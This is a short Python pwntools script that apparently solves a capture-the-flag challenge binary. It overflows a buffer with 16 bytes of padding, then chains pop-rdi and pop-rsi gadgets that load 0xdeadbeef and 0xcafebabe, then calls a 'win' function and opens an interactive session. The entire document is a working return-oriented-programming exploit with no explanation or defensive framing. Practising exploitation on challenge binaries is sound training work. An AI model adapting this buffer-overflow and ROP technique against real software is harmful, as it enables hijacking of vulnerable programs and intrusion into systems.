from pwn import *
p = process("./challenge5")
pop_rdi=0x4011bd
pop_rsi=0x4011bf
win_addr=0x4011ea
ret_addr=0x40129e
payload = b'A'*16 
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xcafebabe)
payload += p64(ret_addr)
payload += p64(win_addr)
p.sendline(payload)
p.interactive()
